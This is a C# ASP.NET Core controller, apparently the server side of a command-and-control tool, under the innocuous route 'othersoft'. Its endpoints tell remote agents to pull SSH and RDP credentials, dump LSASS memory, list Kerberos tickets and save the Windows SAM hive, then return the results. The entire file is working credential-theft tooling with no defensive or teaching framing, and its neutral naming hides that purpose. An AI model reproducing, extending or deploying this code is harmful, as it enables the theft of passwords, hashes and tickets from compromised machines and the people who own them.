using System.Text.Json;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/othersoft")]
[Authorize]
public class OtherSoftController : ControllerBase
{
    private readonly RelayService _relay;

    public OtherSoftController(RelayService relay)
    {
        _relay = relay;
    }

    private async Task<IActionResult> RelayAndWaitAsync(string agentId, object data, CancellationToken ct, int timeoutSeconds = 30)
    {
        var response = await _relay.RelayAndWaitAsync(agentId, "creds", data, ct,
            TimeSpan.FromSeconds(timeoutSeconds), createdBy: User.Identity?.Name ?? "system-relay");
        if (response == null)
            return StatusCode(504, new { error = "Agent did not respond in time." });
        return Content(response, "application/json");
    }

    [HttpPost("{agentId}/ssh")]
    public async Task<IActionResult> GetSSH(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, new { op = "ssh" }, ct, 20);
    }

    [HttpPost("{agentId}/rdp")]
    public async Task<IActionResult> GetRDP(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, new { op = "rdp" }, ct, 30);
    }

    [HttpPost("{agentId}/lsass")]
    public async Task<IActionResult> DumpLsass(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var path = body.TryGetProperty("path", out var p) ? p.GetString() ?? "" : "";
        return await RelayAndWaitAsync(agentId, new { op = "lsass", path }, ct, 60);
    }

    [HttpPost("{agentId}/klist")]
    public async Task<IActionResult> Klist(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, new { op = "klist" }, ct, 30);
    }

    [HttpPost("{agentId}/sam")]
    public async Task<IActionResult> SaveSam(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var dir = body.TryGetProperty("dir", out var d) ? d.GetString() ?? "" : "";
        return await RelayAndWaitAsync(agentId, new { op = "sam", dir }, ct, 30);
    }
}
